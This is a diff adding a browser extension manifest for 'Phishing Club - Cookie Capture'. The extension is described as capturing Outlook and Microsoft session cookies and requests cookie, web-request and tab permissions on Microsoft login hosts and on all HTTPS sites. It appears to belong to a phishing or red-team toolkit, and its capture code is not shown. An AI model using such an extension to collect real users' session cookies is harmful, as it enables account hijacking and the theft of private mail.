@@ -1,0 +1,42 @@
+{
+  "manifest_version": 3,
+  "name": "Phishing Club - Cookie Capture",
+  "version": "1.0.0",
+  "description": "Capture Outlook/Microsoft session cookies for Phishing Club cookie store integration",
+  "permissions": [
+    "cookies",
+    "storage",
+    "notifications",
+    "webRequest",
+    "tabs"
+  ],
+  "host_permissions": [
+    "https://outlook.live.com/*",
+    "https://outlook.office365.com/*",
+    "https://outlook.office.com/*",
+    "https://*.live.com/*",
+    "https://login.microsoftonline.com/*",
+    "https://substrate.office.com/*",
+    "https://*.office.com/*",
+    "https://*.office365.com/*",
+    "https://m365.cloud.microsoft.com/*",
+    "https://*.microsoftonline.com/*",
+    "https://*/*"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "action": {
+    "default_popup": "popup.html",
+    "default_icon": {
+      "16": "icons/icon16.png",
+      "48": "icons/icon48.png",
+      "128": "icons/icon128.png"
+    }
+  },
+  "icons": {
+    "16": "icons/icon16.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
+  }
+}
